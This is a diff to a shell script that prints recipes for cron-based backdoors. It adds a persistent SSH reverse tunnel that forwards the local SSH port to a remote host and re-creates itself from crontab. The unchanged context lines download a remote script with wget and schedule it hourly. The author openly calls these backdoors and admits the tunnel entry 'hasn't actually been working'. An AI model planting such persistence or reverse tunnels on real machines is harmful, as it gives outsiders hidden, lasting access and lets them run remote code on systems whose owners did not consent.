@@ -3,6 +3,8 @@
 ## If you experiment with these backdoors, please don't use my webserver and email address!
 ## You'll find that you can easily spot these types of backdoor in your crontab (they are not well hidden).
 
+SSH_TUNNEL_COMMAND="ssh -R 8922:localhost:22 joey@neuralyte.org sleep 24h"
+
 cat << !!
 
 ### As root:
@@ -26,4 +28,10 @@ cat << !!
 wget -nv -O ~/.revssh http://hwi.ath.cx/jshtools/revsshserver
 ( crontab -l ; echo '00 * * * * sh ~/.revssh -check 2>/dev/null > /dev/null &' ) | crontab -
 
+## If you have already run "ssh-keygen -t dsa", and copied your public key to the remote machine, you can create a persistent reverse tunnel like this:
+# ( crontab -l ; echo '00 06 * * * $SSH_TUNNEL_COMMAND 2>/dev/null >/dev/null' ) | crontab -
+( crontab -l ; echo '00 06 * * * ps -u | grep "$SSH_TUNNEL_COMMAND" 2>&1 >/dev/null || $SSH_TUNNEL_COMMAND 2>/dev/null >/dev/null' ) | crontab -
+## BUG TODO: this hasn't actually been working for me, but I have an implementation where cron runs a shellscript which works.
+
 !!
+
